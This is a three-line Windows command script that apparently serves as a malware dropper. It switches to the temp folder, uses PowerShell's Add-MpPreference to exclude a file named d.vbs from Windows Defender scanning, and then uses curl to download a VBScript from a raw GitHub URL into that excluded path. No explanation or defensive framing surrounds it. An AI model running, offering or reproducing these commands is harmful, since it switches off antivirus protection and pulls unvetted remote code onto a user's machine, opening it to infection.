cd %temp%
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\d.vbs'"


curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/lod.vbs -o d.vbs
